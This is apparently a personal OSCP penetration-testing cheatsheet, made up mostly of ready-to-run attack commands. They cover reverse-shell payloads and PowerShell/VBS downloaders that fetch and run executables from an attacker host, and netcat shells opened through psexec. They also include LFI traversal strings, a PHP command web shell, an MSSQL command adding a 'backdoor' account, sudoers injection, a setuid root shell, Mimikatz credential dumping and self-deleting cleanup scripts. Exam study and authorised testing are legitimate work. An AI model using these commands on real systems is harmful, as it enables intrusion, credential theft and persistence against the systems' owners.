# OSCP Cheatsheet

This was the cheatsheet and containing the methodologies that were compiled when I took my OSCP.

I just left this as is and made a bigger cheatsheet on top of this, which is this site.

---

## OSINT
* GDorks
* Open up the social media accounts

---

## Reconnaissance
```bash
nmap -sP $subnet -oA sP-$subnet
nmap -sS $host -oA sS-$rhost
nmap -A -p $ports -oA A-$rhost
nmap -sS -T4 -p- $host -oA -sS-T4-p-$rhost
nmap -sC -T4 $host  -oA sC-T4-$host  nmap -sT -T4 $host -oA sT-T4-$rhost  nmap -sA -T4 $rhost -oA sA-T4-$rhost 
unicornscan -v -m U -p all $rhost unicornscan-udp-$rhost
python3 autorecon.py $rhost
```
### More NMAP
* NOTE: Just use [naabu](https://github.com/projectdiscovery/naabu) from Project Discovery for basic TCP port scanning
```
sudo ~/go/bin/naabu -stats -verify -l hosts.txt -output output.txt
```
* Another alternative (Massscan)
```
sudo masscan -p 0-65535 --open -iL hosts.txt -oG output.txt|tee -a output_backup.txt
```
* Speeding up NMAP (arguments)
```
-T4 --max-rtt-timeout 200ms --max-retries 1 --max-scan-delay 10ms --min-hostgroup 64 --version-intensity 1
```
* Resume NMAP scan
```
# Which is why it is import to do -oX or -oA
nmap --resume previous_cancelled_output.xml
```

---

## Network
* SNMP: 
    ```bash
    snmp-check $rhost
    snmpwalk -v $snmpVersion -c $snmpComString $rhost
    ```
* RPC:
    ```bash
    enum4linux $rhost
    python ridenum.py $rhost 1 50000 
    # Note Max: 100 range only. duplicate py and edit, add on line #97 sid="S-1-5-21-3001938989-124212845-530053634", get the sid from rpcclient manually using command lookupnames root or administrator
    rpcclient -U "" $rhost
    smbtree $rhost
    ```

* NFS: 
    ```bash
    showmount -e $rhost
    ```

* SMB/SAMBA:
    ```bash
    #!/bin/sh
    #Author: rewardone
    #Thanks fellow student OS-40285!
    #
    #Description:
    # enum4linux messed up and doesnt report samba version.
    # 
    # Requires root or enough permissions to use tcpdump
    # Will listen for the first 7 packets of a null login
    # and grab the SMB Version
    #Notes:
    # Will sometimes not capture or will print multiple
    # lines. May need to run a second time for success.
    if [ -z $1 ]; then echo "Usage: $0 <ipaddress> <port>" && exit; else rhost=$1; fi 
    if [ ! -z $2 ]; then rport=$2; else rport=139; fi
    tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " & 
    echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
    echo "" && sleep .1
    ```
    ```bash
    for i in $(ls /usr/share/nmap/scripts|grep smb-vuln-); do echo ==================== && echo [+] $i && echo ==================== && nmap --script $i -p 139,445 $rhost;done
    ```
    ```bash
    nmap -v -sV -p 139,445 --script="smb-vuln-*" $rhost
    ```
* FTP:
    ```bash
    nmap -b anonymous:anonymous@$rhost $rhost -p- -Pn
    ```
* TCPDUMP:
    ```bash
    tcpdump -A -XX -vvv -n -i eth0 src $rhost
    ```

---

## Databases
* TNSListener
* MySQL: Executing shell on windows from db:[^35]
    * HackMag[^36]
* MSSQL: 
    ```
    nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $rhost -p1433 --script-args mssql.username=sa,mssql.password=$password,ms-sql-xp-cmdshell.cmd="net user backdoor backdoor123 /add"
    ```
* MSSQL:
    * (From Impacket)
    ```bash
    ./mssqlclient.py sa:password@$rhost -p 1433 
    ```

---

## Web
```bash
wafw00f http://$rhost
nikto -h $url -C all -oX
```

* Directory: 
    ```bash
    ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u https://gg.example.com/FUZZ -recursion -recursion-depth 3 -recursion-strategy greedy -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4674.0 Safari/537.36" -o output
    gobuster dir -w $dirlist -u http://$rhost -l -t 50 (l for size,t for threads)
    dirbuster -l /usr/share/wordlists/dirbuster/directory-list-1.0.txt =R  -s / -t 40 -r ./dirbuster-$host -u http://$host (Turn off "recursive"  adjust threads to 30-45)
    cat ~/Results/naabu/naabu_all_ports_withoutIPs_https.txt | ~/Tools/feroxbuster --stdin --parallel 10 -e -A -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o ~/Results/feroxbuster/naabu_raft-large-directories.txt
    skipfish -YO http://$rhost:$rport -o skipfish_output
    wget -r http://$rhost:$rport -o wget_output
    # BurpSuite - Spider from Results of dirbuster
    ```
* Webdav Test
    ```bash
    davtest -url $url
    cadaver $url:80
    ```


* LFI: 
    ```bash
    http://$url/index/../../../../etc/passwd
    $url/index/../../../../etc/passwd%00
    \n \r
    ```
    * Bypass Sanitation:
        ```
        $url/index/2E%2E%%2F%2E%2E%%2F%2E%2E%%2F%2E%2E%%2Fetc%2Fpasswd
        $url/index/..\/..\/..\/..\/etc\/passwd
        $url/index/..//..//..//..//etc//passwd
        $url/index/..///..///..///..///etc///passwd
        # http://www.vulnerability-lab.com/resources/documents/587.txt
        ```
    ```bash
    dotdotpwn -m http-url -u http(s)://$rhost:$rport/$somepage.php?$page=TRAVERSAL -k $word (root if linux, find if MS) 
    LFI_Scanner.py (https://github.com/monkeysm8/CTF-Stuff/blob/master/LFI_Scanner.py)
    ```
* LFI to RCE: 
    * To try first before the proc/self/fd/$numberToFigureOut: Proc/self/environ
    ```bash
    https://$url/$directory/$somephp.php?$phpfunction=../../../../../../../../../proc/self/fd/$numberFromFDsizeFindOutfromProcSelfStatus(number usually 0-32)
    ```
    * paste the following in User-Agent Burp: `#!php <?php system($_GET['cmd']); ?>` then access 1st url in this line/section then add =$command at the end [^31][^32]
    * Another version of above. Input `#!php <?php system($_GET[‘cmd’]); ?>` in URL first then access the access or error log 
    * Go through this link one by one [^33][^34]

* PUT:
    * UPLOAD: 
        ```bash
        curl --upload-file  php-reverse-shell.txt -v --url http://$rhost/$dir/reverse_shell.php -0 --http1.0
        ```
* Adobe Coldfusion: https://nets.ec/Coldfusion_hacking
* SQLi: 
    ```bash
    nmap -sV -p $rport --script=http-sql-injection $rhost
    ```
* WFUZZ:
    * Directory:
        ```bash
        wfuzz -v -c  -w $wordlist -u $url/FUZZ -p $burpIPandPort:HTTP  -H "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0" -H "$Cookie_Field" -f wfuzz_results.txt #(put FUZZ wherever you want to) 
        ```
    * SQLi: 
        ```bash
        wfuzz -v -c  -w /usr/share/wordlists/wfuzz/Injections/SQL.txt -u $url/index.php?id=FUZZ -p $burpIPandPort:HTTP  -H "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0" -H "$Cookie_Field" -f wfuzz_results.txt
        ```
        * Wordlists
            * [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi)
            * [FuzzDB](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection/detect)
           
    * BRUTEFORCE:
        * MULTIPLE:
            ```bash
            wfuzz -v -c  -w $wordlist_username -w $wordlist_password -u $url/login.php -d "username=FUZZ=FUZ2Z" -p $burpIPandPort:HTTP  -H "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0" -H "$Cookie-Field" -f wfuzz_results.txt
            ```
        * SINGLE:
            ```bash
            wfuzz -v -c  -w $wordlist -u $url/login.php -d "username=admin=FUZZ" -p $burpIPandPort:HTTP  -H "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0" -H "$Cookie-Field" -f wfuzz_results.txt
            ```
* WORDPRESS:
    ```bash
    wpscan --url http://$rhost
    wpscan --url http://$rhost --enumerate u
    wpscan --url http://$rhost --wordlist /usr/share/wordlists/rockyou-10k.txt --user admin
    nmap -sV --script=http-wordpress-brute --script-args 'userdb=/root/Downloads/user.txt,passdb=/usr/share/wordlists/rockyou-10k.txt,http-wordpress-brute.threads=3,brute.firstonly=true' $rhost
    ```
    * Dashboard to RCE Shell: [Pentaroot](https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/)

---

## Brute Forcing Online
1. `#!bash cewl $url -m 6 -w $url.txt`
1. Edit /etc/john/john.conf and add the lines below to the end
    ```
    20$[0-2]$[0-9]
    19$[5-9]$[0-9]
    $[0-9]$[0-9]
    $[0-9]$[0-9]$[0-9]
    ```
1. `#!bash john --wordlist=cewl-$url.txt --rules --stdout  cewl-johnMutated-wordlist-$url.txt`

* SSH/FTP/MSSQL:
    ```bash
    hydra -t 4 -l $username -P $wordlist $rhost $protocol(ssh/ftp/mssql)[common usernames: mssql=sa,ssh=root,ftp=anonymous/root,]
    ```
* RDP:
    ```bash
    ncrack -u $username -P $wordlist $rhost:$rport
    ```
* WEB:
    ```bash
    medusa -h $url -u admin -P cewl-johnMutated-wordlist-$url.txt -M http -m DIR:/(where the login is) -T 10
    ```
    * BurpSuite
* HTTP-BasicAuth: 
    ```bash
    hydra -t 4 -L $username-wordlist -P cewl-johnMutated-wordlist-$url.txt $rhost -s $rport http-get /$rpath
    ```
* SMB:
    ```bash
    hydra -l $username -P $wordlist.txt $rhost smb -V
    ```

---

## Exploitation
* exploit-db.com
* Security Focus
* CVE details
* Github
* Google
* Compilation: i686-w64-mingw32-gcc -lws2_32 $filename.c -o $filename.exe

---

## Initial Shell Checks
* Windows: 
    ```batch
    hostname & whoami /all & ipconfig & systeminfo & net user & net localgroup & net user /domain & tasklist /V
    ```
* Linux:
    ```bash
    hostname && whoami && id && w && ifconfig && cat /etc/*release* && uname -a && env && export -p && sudo -l
    ```
* **Find** in Windows:
    ```batch
    dir /s $driverletter:\$filenameorpattern - i.e.(dir /s c:\proof.txt)
    ```
* **Find** in Unix:
    ```bash
    find / -name $filenametofind
    ```

## Shells
* Try to use empire instead of metasploit for post exploitation and reverse shell
* MSFVENOM:
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o reverse_shell.exe
    ```

* WGET-Win-PS1:
    ```powershell
    echo $storageDir = $pwd  wget.ps1
    echo $webclient = New-Object System.Net.WebClient wget.ps1
    echo $url = "http://$lhost:8000/reverse_shell.exe" wget.ps1
    echo $file = "reverse_shell.exe" wget.ps1
    echo $webclient.DownloadFile($url,$file) wget.ps1
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
    ```

* WGET-Win-VBS:
    ```batch
    echo strUrl = WScript.Arguments.Item(0)  wget.vbs
    echo StrFile = WScript.Arguments.Item(1)  wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  wget.vbs
    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  wget.vbs
    echo Err.Clear  wget.vbs
    echo Set http = Nothing  wget.vbs
    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")  wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")  wget.vbs
    echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  wget.vbs
    echo http.Open "GET", strURL, False  wget.vbs
    echo http.Send  wget.vbs
    echo varByteArray = http.ResponseBody  wget.vbs
    echo Set http = Nothing  wget.vbs
    echo Set fs = CreateObject("Scripting.FileSystemObject")  wget.vbs
    echo Set ts = fs.CreateTextFile(StrFile, True)  wget.vbs
    echo strData = ""  wget.vbs
    echo strBuffer = ""  wget.vbs
    echo For lngCounter = 0 to UBound(varByteArray)  wget.vbs
    echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  wget.vbs
    echo Next  wget.vbs
    echo ts.Close  wget.vbs
    cscript wget.vbs http://$lhost:8000/reverse_shell.exe reverse_shell.exe
    ```
* WGET-Windows-FTP:
    ```batch
    echo open $lhost 21 ftp.txt
    echo USER anonymous ftp.txt
    echo anonymous ftp.txt
    echo bin  ftp.txt
    echo hash  ftp.txt
    echo GET reverse_shell.exe  ftp.txt
    echo bye  ftp.txt
    ftp -v -n -s:ftp.txt
    ```
* WGET-Python:
    ```batch
    python -c "import urllib; urllib.urlretrieve ('http://$url:8000/$filename', 'C:\$filename')"
    ```

* Hosting-HTTP:
    ```batch
    python3 -m http.server
    ```
* Hosting-FTP:
    ```batch
    python -m pyftpdlib -p 21(pip install pyftpdlib)
    ```

---

## Privilege Escalation - Linux
* linuxprivchecker.py [^1]
[^1]: [sleventyeleven](https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py)
* linux-local-enum.sh[^2]
[^2]: [highon.coffee](https://highon.coffee/downloads/linux-local-enum.sh)
* LinEnum.sh [^3]
[^3]: [rebootuser](https://github.com/rebootuser/LinEnum)
* Pspy:
    ```batch
    ./pspy64 -pf -i 1000 -c  (Run this in another terminal/shell right after enum scripts)
    ```
* Check for writable folders:

    ```bash
    for directory1 in $(ls -lR 21 / | grep -v "Permission" |grep dr|grep xrw|grep -v "drwxrwxr-x"|grep -v driver|grep -v drv|grep -v ""|awk '{print $9}'); do for directory2 in $(find / -name $directory1 21|grep -v "Permission"); do ls -ld $directory2|grep xrw|grep -v ""; done; done
    ```
* ADD to sudoers command:
    ```bash
    echo '#!/bin/bash'  /tmp/addMeToSUDOERS
    echo 'echo "www-data ALL=NOPASSWD: ALL"  /etc/sudoers && chmod 440 /etc/sudoers'  /tmp/addMeToSUDOERS
    ```
* ADD to sudoers command:
    * ALTERNATIVE to ABOVE:
        ```c
        int main(void)
        { 
        setgid(0);
        setuid(0);
        execl("/bin/sh", "sh", 0); 
        }
        # Compile with: `gcc test.c -o test`
        ```
        ```bash
        #!/bin/bash
        chown root /tmp/test 
        chgrp root /tmp/test
        chmod u+s /tmp/test 
        ```
* OUT_OF_IDEAS?:   dpkg -l    and check versions with exploit-db
* STILL OUT?: Follow g0tm1lk [^4]
[^4]: [g0tm1lk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

---

## Privilege Escalation - Windows
* WindowsPrivCheck.bat [^5][^6](requires accesschk.exe)
    ```powershell
    powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/WinPrivCheck.bat','WinPrivCheck.bat');"
    ```  
    ```powershell
    powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadFile('http://$lhost:$lport/accesschk.exe','accesschk.exe');" 
    ```
* windows-privesc-check2.exe
    *  
        ```batch
        windows-privesc-check2.exe -A --dump
        ```
* Check for missing patches:
    * WMIC: 
        ```batch
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        ```
* POTATO: by foxglovesec:
    ```batch
    start /b Potato.exe -ip 10.11.1.218 -cmd "C:\\temp\\rev.exe" -disable_exhaust true
    ```
* With Powershell
    * PowerSploit-PowerUp.ps1:
        ```powershell
        powershell -exec bypass -windowstyle hidden -command "IEX (New-Object System.Net.Webclient).DownloadString('http://$lhost:$lport/PowerUp.ps1');Invoke-AllChecks"
        ```
    * PowerSploit-PowerUp.ps1:
        * In PowerShell Exec BypassMode:
            * `#!powershell Import-Module .\PowerUp.ps1` \r\n then in another line `#!powershell Invoke-AllChecks`
    * PowerUp.ps1:
        * `#!powershell Write-UserAddMSI` (if installedAlwaysElevated in On)
    * Sherlock:
        * 
            ```powershell
            powershell -exec bypass -windowstyle hidden -command "IEX (New-Object System.Net.Webclient).DownloadString('http://$lhost:$lport/Sherlock.ps1');Find-AllVulns"
            ```
    * JAWS:[^7]

        ```powershell
        CMD C:\temp powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
        ```

    * POTATO: PS: Tater by Kevin Robertson
    * Find SSH,RDP Creds: SessionGopher by FireEye
    * Empire Privilege Escalation
    * Also check [wadcoms](wadcoms.github.io)

* To NTAUTHORITY
    * Escalating to NTAUTHORITY\System:
        ```batch
        psexec.exe -accepteula -s -u $username cmd
        ```
    * Escalating to NTAUTHORITY\System (w/rdp):
        ```batch
        psexec.exe -accepteula -s -u $username -p $password nc $lhost $lport C:\Windows\System32\cmd.exe
        ```
    * Escalating to NTAUTHORITY\System (w.o./rdp):
        ```batch
        psexec.exe -accepteula -i -s C:\dir\dir\nc.exe $lhost $lport -e  C:\windows\system32\cmd.exe
        ```
    * Escalating to NTAUTHORITY\System: 
        ```batch
        runas nc $lhost $lport C:\Windows\System32\cmd.exe
        ```

---

## Privilege Escalation Exploits
* LINUX: Ubuntu 11.04/11.10 or Linux Kernel 2.6.39  3.2.2 which covers 3.0.0 too BTW Memmodipper [^8]
[^8]: [Memmodipper](https://www.exploit-db.com/exploits/18411)
* LINUX: DirtyCow: Ubuntu 12.04 LTS ,Ubuntu 14.04 LTS (Linux Mint 17.1),Debian 8 ,Ubuntu 16.04 LTS ,Ubuntu 16.10 ,RHEL 7, CentOS 7 ,RHEL 6, CentOS 6 ,RHEL 5, CentOS 5
* LINUX: CHKROOTKIT: 0.49 [^9]
[^9]: [chkrootkit](https://www.exploit-db.com/exploits/33899)

---

## Dumping Credentials
* Mimikatz: Either PS Empire, Meterpreter, or direct download of exe file [^10]
[^10]:  [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest)
* Mimikatz:
    * Binary:
        ```
        log
        privilege::debug
        sekurlsa::logonPasswords
        lsadump::sam
        lsadump::secrets
        lsadump::cache
        vault::cred
        vault:list
        ```
* `#!batch wce.exe -w` [^11]
[^11]: [Amplia Security](https://www.ampliasecurity.com/research.html)
* `#!batch fgdump.exe` [^12]
[^12]: [Foofus](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)

---

## Network Pivoting

* Windows:
    * Plink:
        ```bash
        plink $lhost -P 22 -C -R 127.0.0.1:$lport:$rhost:$rport
        ```
* Linux:
    * Proxychains: 
        *
            ```bash
            ssh -D 127.0.0.1:$lport -p 22 $ruser@pivot-target-ip
            ```
        * (Add socks4 127.0.0.1 $lport in /etc/proxychains.conf)

        * [all_cmds_on_kali] 
            ```bash
            ssh -D $proxychainsport -p 22 $ruser@$rhost
            ```
            * (Add in last line in /etc/proxychains.conf: socks4 127.0.0.1 $proxychainsport )
            * proxychains [command )i.e. nmap . ..)]

---

## OSCP Post Checks
* Windows:
    * Plink:
        ```bash
        plink $lhost -P 22 -C -R 127.0.0.1:$lport:$rhost:$rport
        ```
    * CREDENTIALS DUMP(`mimikatz,wce,fgdump`) then 
        ```batch
        systeminfo & ipconfig & route print & arp -a & dir /s network-secret.txt & dir /s *pass* & psloggedon.exe -accepteula
        ```

    * ProxyChains:
        * proxychain via ssh to target then:
            * proxychains /root/Tools/post_checks.sh

    * [all_cmds_on_kali]
        ```bash
        ssh -D $proxychainsport -p 22 $ruser@$rhost
        ```
        * (Add in last line in /etc/proxychains.conf: socks4 127.0.0.1 $proxychainsport )
        * proxychains [command )i.e. nmap . ..)]

    * Enable RDP:[^12]
    [^12]: [Hacking Tutorial](https://www.hacking-tutorial.com/tips-and-trick/how-to-enable-remote-desktop-using-command-prompt/)

* Linux:
    ```bash
    ls /root && cat /root/proof.txt && find / -name network-secret.txt && cat /etc/shadow && route -n && arp -a && ifconfig && netstat -plunt && w  
    ```

---

## House Cleaning
* Generic - Remove Reverse Shells
* Generic - Remove Reverse Meterpreter
* Generic - Remote Accounts
* Web - Reverse/Bind PHP files
* Web - Remove Reflected XSS Entries
* Windows - Remove Task Scheduler
* Windows - Remove Registry
* Windows - Remove Startup Folder
* Linux - Remove Crontab entries
* Linux - Remove Cron.d entries
* Linux - Remove rc.local entries
* Linux - Remove /etc/init.d/ entries
* Linux - Remove Sysctl entries
* Phishing - Removal of Phishing email
* Malware - Activate Kill Switch
* Malware - Cleanup manually
* Self Deleting Batch Command:
    ```batch
    echo timeout /t 60 >>  cleanupselfdelete.bat
    echo del reverse_shell.exe >> cleanupselfdelete.bat
    echo ^(goto^) 2^nul ^ del ^"%~f0^" >> cleanupselfdelete.bat
    start cleanupselfdelete.bat
    ```

---

## CheatSheets 
* Common Commands [^13]
[^13]: [neomh](https://github.com/neomh/cheat-sheets/blob/master/Commands)
* Pentest Monkey[^14]
[^14]: [Pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* *UPDATE January 2021: This cheatsheet!*

---

## Other Resources
* VA-UK[^15]
[^15]: [Vulnerabilityassessment.co](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)
* Password List[^16]
[^16]: [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials)
* Escaping Shell[^17]
[^17]: [Escape from shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

---

## OSCP Resources
* Noobpad [^18]
[^18]: [ianthomasfry](https://ianthomasfry.blogspot.com/2017/05/oscp-exam-study-guide-i-first-steps.html)
* Sec Juice[^19]
[^19]: [Sec Juice](https://www.secjuice.com/oscp-prep-guidance/)
* scund00r[^20]
[^20]: [scund00r](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)
* backdoorshell[^21]
[^21]: [backdoorshell](https://backdoorshell.gitbooks.io/oscp-useful-links/content/fuzzing.html)
* 0xc0ffee[^22]
[^22]: [0xc0ffee](http://0xc0ffee.io/blog/OSCP-Goldmine)
* swisskyrepo[^23]
[^23]: [swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/)
* ihack4falafel[^24]
[^24]: [ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/Bookmark%20List.pdf)
* kevsec[^25]
[^25]: [kevsec](http://kevsec.fr/resources/)
* futureoscp[^26]
[^26]: [futureoscp](http://futureoscp.blogspot.com/2017/10/usefull-oscp-material.html)


[^5]: [WindowsPrivCheck](https://github.com/ihack4falafel/OSCP/blob/master/Documents/Upgrading%20half%20shells%20to%20fully%20interactive%20TTYs.pdf)
[^6]: [Accesschk](https://download.sysinternals.com/files/AccessChk.zip)

[^7]: [JAWS](https://github.com/411Hall/JAWS.git)
[^31]: [Exploit-db-130179](https://www.exploit-db.com/papers/13017)
[^32]: [hackingarticles](https://www.hackingarticles.in/5-ways-exploit-lfi-vulnerability/)
[^33]: [Graceful security](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
[^34]: [3mrgnc3](https://github.com/3mrgnc3/LFIter2/blob/master/win-fpaths.txt)
[^35]: [Ethical Hackers Club](https://www.youtube.com/watch?v=1fkgo4hsyp8)
[^36]: [HackMag](https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/)
